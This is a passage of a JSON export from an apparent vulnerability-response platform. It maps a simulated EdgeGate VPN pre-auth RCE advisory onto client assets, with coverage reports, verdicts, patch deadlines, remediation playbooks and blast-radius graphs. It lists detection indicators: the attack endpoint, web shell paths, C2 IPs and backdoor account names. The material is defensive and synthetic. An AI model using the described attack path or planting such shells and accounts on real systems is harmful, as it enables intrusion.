          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-LOTUS-001",
      "root_node_id": "lotus-vpn-gw-01",
      "nodes": [
        {
          "id": "lotus-vpn-gw-01",
          "label": "lotus-vpn-gw-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": true
        },
        {
          "id": "lotus-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": true
        },
        {
          "id": "lotus-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "lotus-vpn-gw-01",
          "target": "lotus-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "high"
        },
        {
          "source": "lotus-vpn-gw-01",
          "target": "lotus-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "high"
        },
        {
          "source": "lotus-cred-vault",
          "target": "lotus-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "high"
        },
        {
          "source": "lotus-jump-host-01",
          "target": "lotus-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "lotus-dc-ad-01",
          "target": "lotus-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 88,
      "summary": "CRITICAL BLAST RADIUS ALERT: Host lotus-vpn-gw-01 possesses active Kerberos tickets and SSH keys capable of pivoting directly to Domain Controller (lotus-dc-ad-01) and Primary Database. Immediate VLAN isolation prevents tier-0 domain compromise."
    }
  },
  "ASSET-LOTUS-003": {
    "asset": {
      "id": "ASSET-LOTUS-003",
      "host_name": "lotus-web-portal-01",
      "tenant_id": "lotus-clinics",
      "owner": "admin@lotusclinics.in",
      "product": "EdgeGate VPN",
      "version": "9.1.2",
      "internet_facing": true,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.66",
      "exposure_tier": "emergency",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-LOTUS-003",
      "overall_coverage": 0.982,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        }
      ],
      "adequate": true,
      "blind_spots": [
        "WEB: Only 43 of 45 days available",
        "ENDPOINT: Only 44 of 45 days available",
        "NETWORK: Only 44 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-LOTUS-003",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 98% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-lotus-web-portal-01"
          ]
        }
      ],
      "coverage_score": 0.982,
      "coverage_report": {
        "asset_id": "ASSET-LOTUS-003",
        "overall_coverage": 0.982,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          }
        ],
        "adequate": true,
        "blind_spots": [
          "WEB: Only 43 of 45 days available",
          "ENDPOINT: Only 44 of 45 days available",
          "NETWORK: Only 44 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.105329+00:00",
      "verdict_hash": "9db752672f67efedd731254609e73841419fe798217234058cf219d0648bd128"
    },
    "gate": {
      "asset_id": "ASSET-LOTUS-003",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.105333+00:00"
    },
    "clock": {
      "asset_id": "ASSET-LOTUS-003",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "emergency (12h)",
      "start_time": "2026-10-18T17:48:03.113088+00:00",
      "deadline_time": "2026-10-19T05:48:03.113088+00:00",
      "seconds_remaining": 43200,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-LOTUS-003-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-LOTUS-003",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate lotus-web-portal-01 (192.0.2.66) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-LOTUS-003",
      "root_node_id": "lotus-web-portal-01",
      "nodes": [
        {
          "id": "lotus-web-portal-01",
          "label": "lotus-web-portal-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "lotus-web-portal-01",
          "target": "lotus-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "lotus-web-portal-01",
          "target": "lotus-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "lotus-cred-vault",
          "target": "lotus-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "lotus-jump-host-01",
          "target": "lotus-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "lotus-dc-ad-01",
          "target": "lotus-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-LOTUS-015": {
    "asset": {
      "id": "ASSET-LOTUS-015",
      "host_name": "lotus-unkn-asset-01",
      "tenant_id": "lotus-clinics",
      "owner": "admin@lotusclinics.in",
      "product": "EdgeGate VPN",
      "version": "Unknown",
      "internet_facing": true,
      "criticality": "critical",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.222",
      "exposure_tier": "emergency",
      "status": "needs_inventory",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
          "confidence": 0.98
        },
        {
          "id": "SENT-03",
          "sentence": "Disclosed: October 9, 2026. First observed in the wild: October 4, 2026.",
          "confidence": 0.98
        },
        {
          "id": "SENT-04",
          "sentence": "Vulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).",
          "confidence": 0.98
        },
        {
          "id": "SENT-05",
          "sentence": "Attackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.",
          "confidence": 0.98
        },
        {
          "id": "SENT-06",
          "sentence": "Following exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.",
          "confidence": 0.98
        },
        {
          "id": "SENT-07",
          "sentence": "Intruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.",
          "confidence": 0.98
        },
        {
          "id": "SENT-08",
          "sentence": "Additionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.",
          "confidence": 0.98
        },
        {
          "id": "SENT-09",
          "sentence": "Patching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.",
          "confidence": 0.98
        },
        {
          "id": "SENT-10",
          "sentence": "Post-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
          "confidence": 0.98
        }
      ],
      "created_at": "2026-10-09T08:00:00Z"
    },
    "evidence": [],
    "coverage": {
      "asset_id": "ASSET-LOTUS-015",
      "overall_coverage": 0.982,
      "sources": [
        {
          "source_type": "web",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        },
        {
          "source_type": "endpoint",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "auth",
          "required_days": 45,
          "available_days": 43,
          "coverage_ratio": 0.956,
          "gaps": [
            "Missing 2 days of historical telemetry (43/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "network",
          "required_days": 45,
          "available_days": 44,
          "coverage_ratio": 0.978,
          "gaps": [
            "Missing 1 days of historical telemetry (44/45 days retained)"
          ],
          "has_retention_blindspot": true
        },
        {
          "source_type": "file",
          "required_days": 45,
          "available_days": 45,
          "coverage_ratio": 1.0,
          "gaps": [],
          "has_retention_blindspot": false
        }
      ],
      "adequate": true,
      "blind_spots": [
        "ENDPOINT: Only 44 of 45 days available",
        "AUTH: Only 43 of 45 days available",
        "NETWORK: Only 44 of 45 days available"
      ],
      "recommendations": [
        "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
      ]
    },
    "verdict": {
      "asset_id": "ASSET-LOTUS-015",
      "advisory_id": "SIM-2026-0001",
      "state": "No evidence found",
      "confidence": "high",
      "reasons": [
        {
          "text": "No indicators of compromise or anomalous exploit behaviors detected across 98% telemetry coverage over the past 45 days.",
          "evidence_ids": [
            "COV-VERIFIED-lotus-unkn-asset-01"
          ]
        }
      ],
      "coverage_score": 0.982,
      "coverage_report": {
        "asset_id": "ASSET-LOTUS-015",
        "overall_coverage": 0.982,
        "sources": [
          {
            "source_type": "web",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          },
          {
            "source_type": "endpoint",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "auth",
            "required_days": 45,
            "available_days": 43,
            "coverage_ratio": 0.956,
            "gaps": [
              "Missing 2 days of historical telemetry (43/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "network",
            "required_days": 45,
            "available_days": 44,
            "coverage_ratio": 0.978,
            "gaps": [
              "Missing 1 days of historical telemetry (44/45 days retained)"
            ],
            "has_retention_blindspot": true
          },
          {
            "source_type": "file",
            "required_days": 45,
            "available_days": 45,
            "coverage_ratio": 1.0,
            "gaps": [],
            "has_retention_blindspot": false
          }
        ],
        "adequate": true,
        "blind_spots": [
          "ENDPOINT: Only 44 of 45 days available",
          "AUTH: Only 43 of 45 days available",
          "NETWORK: Only 44 of 45 days available"
        ],
        "recommendations": [
          "Log coverage is sufficient to assess pre-disclosure exploitation with high confidence."
        ]
      },
      "evaluated_at": "2026-10-18T17:48:03.109905+00:00",
      "verdict_hash": "006c2199e37679ba8e73c7a741914204a4a110888445951bca786dbf190e9d60"
    },
    "gate": {
      "asset_id": "ASSET-LOTUS-015",
      "advisory_id": "SIM-2026-0001",
      "outcome": "Patch now",
      "gate_locked": false,
      "required_roles": [
        "Asset_Owner"
      ],
      "override_applied": false,
      "override_reason": null,
      "override_approver": null,
      "status": "pending",
      "created_at": "2026-10-18T17:48:03.109909+00:00"
    },
    "clock": {
      "asset_id": "ASSET-LOTUS-015",
      "advisory_id": "SIM-2026-0001",
      "profile": "CERT-In 12h/1d/3d/5d",
      "target_tier": "emergency (12h)",
      "start_time": "2026-10-18T17:48:03.113187+00:00",
      "deadline_time": "2026-10-19T05:48:03.113187+00:00",
      "seconds_remaining": 43200,
      "is_paused": false,
      "is_breached": false,
      "pause_reason": null
    },
    "playbook": {
      "id": "PLAYBOOK-ASSET-LOTUS-015-CVE-2026-9901",
      "advisory_id": "SIM-2026-0001",
      "asset_id": "ASSET-LOTUS-015",
      "steps": [
        {
          "step_id": "STEP-CONT-01",
          "title": "Network Containment / VLAN Isolation",
          "phase": "containment",
          "description": "Isolate lotus-unkn-asset-01 (192.0.2.222) from production network to quarantine VLAN to prevent lateral movement.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify ping loss from internal LAN subnet while preserving access via out-of-band management.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CONT-02",
          "title": "Forensic Evidence Preservation",
          "phase": "containment",
          "description": "Take live memory snapshot and preserve volatile network socket states before host reboot or patching.",
          "owner": "dfir-lead@postern.local",
          "status": "pending",
          "verification_method": "Confirm cryptographic SHA-256 hash generated for memory dump image.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-01",
          "title": "Terminate All Stolen Active Sessions",
          "phase": "cleanup",
          "description": "Flush all authenticated VPN and admin session tokens from memory and local session store (e.g. /var/run/edgegate/sessions).",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Query auth daemon session table to confirm 0 active sessions remain.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-02",
          "title": "Remove Unauthorized Web Shells & Implants",
          "phase": "cleanup",
          "description": "Scan and remove /var/www/html/assets/.sys_cache.php and check file integrity of web portal root.",
          "owner": "sysadmin@postern.local",
          "status": "pending",
          "verification_method": "Run file integrity checker to verify directory matches pristine distribution hash.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-03",
          "title": "Rotate Administrator & Service Credentials",
          "phase": "cleanup",
          "description": "Rotate master LDAP/AD bind credentials, local root passwords, and VPN preshared keys.",
          "owner": "iam-admin@postern.local",
          "status": "pending",
          "verification_method": "Check password last-changed timestamp in directory service.",
          "verified_at": null,
          "verified_by": null
        },
        {
          "step_id": "STEP-CLEAN-04",
          "title": "Audit Local Accounts for Dormant Backdoors",
          "phase": "cleanup",
          "description": "Check /etc/passwd and /etc/shadow for unauthorized accounts such as 'svc_sec_audit' or 'backdoor_adm'.",
          "owner": "secops-analyst@postern.local",
          "status": "pending",
          "verification_method": "Verify diff against baseline authorized user manifest.",
          "verified_at": null,
          "verified_by": null
        }
      ]
    },
    "blast_radius": {
      "asset_id": "ASSET-LOTUS-015",
      "root_node_id": "lotus-unkn-asset-01",
      "nodes": [
        {
          "id": "lotus-unkn-asset-01",
          "label": "lotus-unkn-asset-01 (Focal Gateway)",
          "type": "host",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-dc-ad-01",
          "label": "Domain Controller (Active Directory)",
          "type": "dc",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-db-primary-01",
          "label": "Core Transaction Database (PostgreSQL)",
          "type": "database",
          "criticality": "critical",
          "compromised": false
        },
        {
          "id": "lotus-jump-host-01",
          "label": "Bastion / Jump Host (OpenSSH)",
          "type": "host",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-cred-vault",
          "label": "Service Account / Kerberos Tickets",
          "type": "credential",
          "criticality": "high",
          "compromised": false
        },
        {
          "id": "lotus-s3-backup",
          "label": "Cold Cloud Storage Backups",
          "type": "service",
          "criticality": "medium",
          "compromised": false
        }
      ],
      "links": [
        {
          "source": "lotus-unkn-asset-01",
          "target": "lotus-cred-vault",
          "relationship": "shared_secret",
          "risk_level": "medium"
        },
        {
          "source": "lotus-unkn-asset-01",
          "target": "lotus-jump-host-01",
          "relationship": "network_egress",
          "risk_level": "low"
        },
        {
          "source": "lotus-cred-vault",
          "target": "lotus-dc-ad-01",
          "relationship": "admin_access",
          "risk_level": "low"
        },
        {
          "source": "lotus-jump-host-01",
          "target": "lotus-db-primary-01",
          "relationship": "trusts",
          "risk_level": "medium"
        },
        {
          "source": "lotus-dc-ad-01",
          "target": "lotus-s3-backup",
          "relationship": "active_session",
          "risk_level": "medium"
        }
      ],
      "blast_radius_score": 22,
      "summary": "Contained Blast Radius: Normal trust paths present; no active lateral credential exposure detected."
    }
  },
  "ASSET-MERIDIAN-002": {
    "asset": {
      "id": "ASSET-MERIDIAN-002",
      "host_name": "meridian-vpn-gw-02",
      "tenant_id": "meridian-finance",
      "owner": "admin@meridianfinance.in",
      "product": "EdgeGate VPN",
      "version": "9.2.1",
      "internet_facing": true,
      "criticality": "high",
      "timezone": "Asia/Kolkata",
      "ip_address": "192.0.2.19",
      "exposure_tier": "high",
      "status": "matched",
      "notes": null
    },
    "advisory": {
      "id": "SIM-2026-0001",
      "cve_id": "CVE-2026-9901",
      "title": "EdgeGate VPN Pre-Auth RCE & Session Hijack",
      "vendor": "EdgeGate Networks",
      "product": "EdgeGate VPN",
      "affected_versions": [
        ">=9.0.0",
        "<=9.2.3"
      ],
      "vuln_class": "Pre-Auth Remote Code Execution (CWE-287 / CWE-78)",
      "exploitation_status": "known_exploited",
      "disclosure_date": "2026-10-09T08:00:00Z",
      "first_known_exploitation_date": "2026-10-04T00:00:00Z",
      "vendor_mitigations": [
        "Upgrade to firmware 9.2.4+",
        "Restrict /api/v1/auth/session to management subnet"
      ],
      "cleanup_notes": [
        "Kill all active admin sessions",
        "Scan /var/www/html/assets/ for .sys_cache.php",
        "Review local admin accounts"
      ],
      "indicators": [
        "198.51.100.42",
        "/var/www/html/assets/.sys_cache.php",
        "svc_sec_audit",
        "198.51.100.89"
      ],
      "raw_text": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)\nProduct: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.\nDisclosed: October 9, 2026. First observed in the wild: October 4, 2026.\nVulnerability Class: Pre-Authentication Remote Code Execution and Session Hijack (CWE-287 / CWE-78).\nAttackers exploit crafted HTTP POST requests to /api/v1/auth/session to bypass authentication and execute code as root.\nFollowing exploitation, attackers commonly plant a web shell at /var/www/html/assets/.sys_cache.php or .sess_key.so.\nIntruders maintain persistent outbound command-and-control beaconing over TLS port 8443 to unusual IP ranges.\nAdditionally, attackers create dormant local administrator accounts such as svc_sec_audit or backdoor_adm.\nPatching to version 9.2.4 or higher fixes the flaw. However, patching alone does NOT terminate valid stolen sessions or remove planted web shells.\nPost-patch verification must confirm termination of all active sessions, removal of unauthorized files, and credential rotation.",
      "source_sentences": [
        {
          "id": "SENT-01",
          "sentence": "SECURITY ADVISORY SIM-2026-0001 (CRITICAL)",
          "confidence": 0.98
        },
        {
          "id": "SENT-02",
          "sentence": "Product: EdgeGate VPN Gateway versions 9.0.0 through 9.2.3.",
